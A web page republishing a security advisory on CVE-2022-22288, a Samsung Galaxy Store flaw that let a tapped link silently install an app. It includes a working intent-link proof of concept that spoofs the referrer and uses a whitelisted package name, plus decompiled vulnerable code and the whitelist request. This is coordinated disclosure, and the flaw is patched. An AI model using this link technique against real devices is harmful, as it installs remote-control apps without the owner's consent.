<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung Galaxy Store Whitelist Abuse | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung Galaxy Store Whitelist Abuse" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Improper authorization vulnerability in Galaxy Store prior to 4.5.36.5 allows remote app installation of the allowlist." />
<meta property="og:description" content="Improper authorization vulnerability in Galaxy Store prior to 4.5.36.5 allows remote app installation of the allowlist." />
<link rel="canonical" href="https://maliciouserection.com/cves/2022-01-01_cve-2022-22288/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2022-01-01_cve-2022-22288/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-01-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung Galaxy Store Whitelist Abuse" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-01T00:00:00+00:00","datePublished":"2022-01-01T00:00:00+00:00","description":"Improper authorization vulnerability in Galaxy Store prior to 4.5.36.5 allows remote app installation of the allowlist.","headline":"Samsung Galaxy Store Whitelist Abuse","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2022-01-01_cve-2022-22288/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2022-01-01_cve-2022-22288/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung Galaxy Store Whitelist Abuse</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <h4 id="original-post-httpslabsf-securecomadvisoriessamsung-galaxy-one-tap-install-malicious-application">Original post: <a href="https://labs.f-secure.com/advisories/samsung-galaxy-one-tap-install-malicious-application/">https://labs.f-secure.com/advisories/samsung-galaxy-one-tap-install-malicious-application/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Galaxy Store prior to version 4.5.36.5</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2022-22288</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Automatic Application Install</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>F-Secure looked into exploiting the Samsung Galaxy S21 device for Austin Pwn2Own 2021. The Galaxy App Store application contained an issue with how it handled browsable intents. Additionally, it was possible to upload a malicious application to the Galaxy App Store and have Samsung host the application. If a user was convinced to tap an attacker controlled hyperlink, the uploaded malicious application would have been automatically installed onto the victim’s device without consent.</p>

<h2 id="the-exploit">The Exploit</h2>

<p>The following hyperlink could have been used to abuse a browsable intent in the Samsung Galaxy App Store application. This link would install a malicious application that has hijacked the namespace of a whitelisted application on the Samsung App Store. An attacker can host this link from any web server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a id="yayidyay" rel="noreferrer" href="intent://apps.samsung.com/appquery/appDetail.as?
appId=live.hatch.russa&amp;directInstall=true&amp;installReferrer=yayreferreryay&amp;directOpen=true&amp;
simpleMode=true#Intent;action=android.intent.action.VIEW;package=com.sec.android.app.samsungapps;
scheme=http;S.android%2eintent%2eextra%2eREFERRER_NAME=http://com.sec.android.app.samsungapps;end"&gt;
YAYPOCYAY&lt;/a&gt;
</code></pre></div></div>

<h2 id="technical-details">Technical Details</h2>

<p>The malicious application that would have been installed is Boops Boops, a re-skinned Drozer application. This issue occurs due to a bug in the Samsung Galaxy App Store (<code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps</code>) class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink.DetailPageDeepLink</code> method <code class="language-plaintext highlighter-rouge">putDetailCommonExtra</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void putDetailCommonExtra(Context context) {
    ...
    if (isDirectInstall() &amp;&amp; appManager.enableDDI(getSender(), getDetailID(), DeeplinkManager.getInstance().getInternalDeeplink())) {
        this.intent.putExtra(DeepLink.EXTRA_DEEPLINK_DIRECT_INSTALL, isDirectInstall());
        this.intent.putExtra("sender", getSender());
    }
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">isDirectInstall</code> is taken from the browsable intent query parameter <code class="language-plaintext highlighter-rouge">directInstall</code> and returns either True or False</li>
  <li><code class="language-plaintext highlighter-rouge">getSender</code> is either the package name or the website URL that sent the browsable intent, which is retrieved from the intent string extra <code class="language-plaintext highlighter-rouge">sender</code> (this intent extra is added or modified in intents by the Android OS when an intent is sent from one application to another)</li>
  <li><code class="language-plaintext highlighter-rouge">getDetailID</code> is taken from the browsable intent query parameter <code class="language-plaintext highlighter-rouge">appId</code></li>
  <li><code class="language-plaintext highlighter-rouge">enableDDI</code> code is below:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean enableDDI(String sender, String appId, boolean isInternalDeeplink) {
    if (isDDITestMode()) {
        return true;
    }
    if ((!isGalaxyStore(sender) || !isInternalDeeplink) &amp;&amp; !isWhiteListAppForOneClick(sender, appId)) {
        return false;
    }
    return true;
}
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">isGalaxyStore</code> returns true if the intent sender package name was <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps</code> or if the website that sent the browsable intent was <code class="language-plaintext highlighter-rouge">http://com.sec.android.app.samsungapps</code></li>
  <li><code class="language-plaintext highlighter-rouge">isWhiteListAppForOneClick</code> returns true if the target package name is in a Samsung controlled whitelist</li>
</ul>

<p>The intent sender package name can be set by an attacker via the intent string extra <code class="language-plaintext highlighter-rouge">android.intent.extra.REFERRER_NAME=com.sec.android.app.samsungapps</code>. Without this intent string extra, <code class="language-plaintext highlighter-rouge">isGalaxyStore</code> would return false since the intent sender would have been a different value, such as the attacker’s website URL.</p>

<p>The Samsung controlled whitelist is obtained by the Galaxy Store application via the following POST request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /ods.as?reqId=2355 HTTP/1.1
Accept: image/webp
Content-Type: text/plain; charset=UTF-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)
Host: us-odc.samsungapps.com
Connection: close
Accept-Encoding: gzip, deflate
Content-Length: 952
 
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;
&lt;SamsungProtocol networkType="0" version2="3" lang="EN" openApiVersion="30" deviceModel="SM-G991B" deviceMakerName="samsung" 
deviceMakerType="0" mcc="310" mnc="00" csc="XME" odcVersion="4.5.30.5" scVersion="1000000" 
storeFilter="themeDeviceModel=SM-G991B_TM||OTFVersion=11010001||gearDeviceModel=SM-G991B_SM-R800||gOSVersion=4.0.0"
supportFeature="ARW||AOD" version="6.8" filter="1" odcType="01" cacheVersion="1" systemId="&lt;redacted&gt;" sessionId="&lt;redacted&gt;" 
logId="&lt;redacted&gt;" deviceFeature="locale=en_US||abi32=armeabi-v7a:armeabi||abi64=arm64-v8a" userMode="0"&gt;
&lt;request name="whiteAppInfo" id="2355" numParam="4" transactionId="&lt;redacted&gt;"&gt;&lt;param name="accountCountry"&gt;
USA&lt;/param&gt;&lt;param name="guestDownloadInfo"&gt;Y&lt;/param&gt;&lt;param name="accountMcc"&gt;310&lt;/param&gt;&lt;param name="requestTypeCode"&gt;0&lt;/param&gt;
&lt;/request&gt;&lt;/SamsungProtocol&gt;
</code></pre></div></div>

<p>The whitelist is found in the response parameter popupDownloadAppList:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
&lt;value name="popupDownloadAppList"&gt;mobi.abcmouse.samsung||com.audible.application.samsung||com.booking.forsamsung||com.cnn.mobile.android.phone|
|com.golfnow.android.samsung.teetimes||com.scribd.app.samsung||com.shazam.android||com.shutterfly.samsung||com.skimble.workouts||me.swiftgift.swiftgift.samsung|
|com.weather.samsung||com.touchofmodern.samsung||com.tubitv.samsung||com.ua.shop.samsung||com.yelp.android||com.aaptiv.android.samsung|
|com.lifesum.madeforsamsung||com.getliner.Liner||com.vsco.cam.samsung||com.rosettastone.madeforsamsung.courseplayer||com.aita||com.degoo.android.samsung|
|com.adobe.reader||com.samsung.m4sscreen||com.adobe.premiererush.videoeditor.samsung||live.hatch.russa||jp.gocro.smartnews.android|
|com.getsomeheadspace.android||com.viewbug.viewbug||com.postmates.android||com.getaround.android&lt;/value&gt;
...
</code></pre></div></div>

<p>It was found that the package name <code class="language-plaintext highlighter-rouge">live.hatch.russa</code> was on the Samsung white list, but that package did not exist on the Samsung App Store itself. F-Secure deployed their custom re-skinned Drozer application called “Boops Boops” to the Samsung App Store with the package name <code class="language-plaintext highlighter-rouge">live.hatch.russa</code>:</p>

<div align="center">
    <img src="/assets/cves/cve-2022-22288_1.png" />
</div>

<p>Source code for the Boops Boops application can be found here: <a href="https://github.com/Yogehi/boops-boops-android-agent">https://github.com/Yogehi/boops-boops-android-agent</a></p>

<p>Source code for the Boops Boops Docker Container which can be used to interact with Boops Boops can be found here: <a href="https://github.com/Yogehi/boops-boops-docker-container">https://github.com/Yogehi/boops-boops-docker-container</a></p>

<h2 id="remedial-action">Remedial Action</h2>

<p>Samsung has released the Galaxy Store version 4.5.36.5 which addresses this issue. Additionally, F-Secure has attempted to re-upload Boops Boops with the package name <code class="language-plaintext highlighter-rouge">live.hatch.russa</code> several times to the Galaxy Store, and it now gets taken down due to a copyright warning.</p>

<div align="center">
    <img src="/assets/cves/cve-2022-22288_2.png" />
</div>

<p>Users should still update their Galaxy Store application to the latest version available.</p>

<h2 id="credits">Credits</h2>

<p>This issue was discovered by Ken Gannon.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>01/11/2021</td>
      <td>Issue disclosed to Samsung Mobile Security</td>
    </tr>
    <tr>
      <td>01/11/2021</td>
      <td>Issue assigned to a Samsung Security Analyst</td>
    </tr>
    <tr>
      <td>01/12/2021</td>
      <td>Samsung confirms the vulnerability and rates it as a critical risk issue</td>
    </tr>
    <tr>
      <td>03/01/2022</td>
      <td>Patch released, Samsung initiates process for bug bounty reward</td>
    </tr>
    <tr>
      <td>04/01/2022</td>
      <td>CVE Assigned</td>
    </tr>
    <tr>
      <td>04/01/2022</td>
      <td>Advisory Published</td>
    </tr>
  </tbody>
</table>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
